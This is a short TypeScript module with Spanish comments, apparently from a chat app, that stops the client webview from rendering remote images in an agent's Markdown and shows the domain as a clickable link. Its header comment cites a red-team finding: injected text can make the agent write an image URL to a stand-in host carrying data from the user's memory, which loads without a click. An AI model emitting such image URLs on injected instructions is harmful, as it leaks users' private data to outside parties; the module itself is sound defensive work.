/**
 * Imágenes remotas en el Markdown del chat (red team 3, A-5; 11 oct 2026). Una inyección puede hacer que el agente
 * escriba `![](https://otro.sitio/p?d=<algo de tu memoria>)`; si el webview la pinta, la petición sale sola, sin
 * clic. En la edición cliente:
 *   - la CSP ya no deja cargar imágenes de `https:` (next.config.ts: `img-src 'self' data: blob:`), y
 *   - el chat no intenta pintarlas: muestra el dominio y un enlace que solo se abre con tu clic (como cualquier enlace).
 * La instalación original pinta como siempre. Módulo puro (cliente y pruebas).
 */

const ESQUEMA_REMOTO = /^(?:https?:)?\/\//i

/** Dominio de una imagen remota (http, https o `//host`), o null si es local, `data:`, `blob:` o ilegible. */
export function dominioDeImagenRemota(src: string | undefined | null): string | null {
  const s = (src ?? '').trim()
  if (!ESQUEMA_REMOTO.test(s)) return null
  try {
    const u = new URL(s.startsWith('//') ? `https:${s}` : s)
    if (u.protocol !== 'http:' && u.protocol !== 'https:') return null
    return u.hostname || null
  } catch { return null }
}

/** ¿Se bloquea esta imagen? Solo en cliente y solo si es remota. Devuelve el dominio para mostrarlo. */
export function imagenRemotaBloqueada(src: string | undefined | null, cliente: boolean): string | null {
  return cliente ? dominioDeImagenRemota(src) : null
}
